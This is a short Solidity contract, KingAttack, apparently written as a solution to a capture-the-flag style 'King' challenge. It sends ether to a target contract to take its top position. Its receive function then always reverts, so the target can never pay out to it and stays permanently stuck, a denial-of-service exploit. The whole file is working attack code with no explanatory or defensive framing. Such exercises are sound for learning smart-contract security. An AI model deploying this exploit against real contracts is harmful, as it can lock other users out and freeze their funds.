// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "./King.sol";

interface IKing {}

contract KingAttack {
    IKing public target;

    constructor(address targetAddress) payable {
        target = IKing(targetAddress);
    }

    function attack() external payable {
        (bool success, ) = payable(address(target)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        revert("You can't be King, sorry");
    }
}
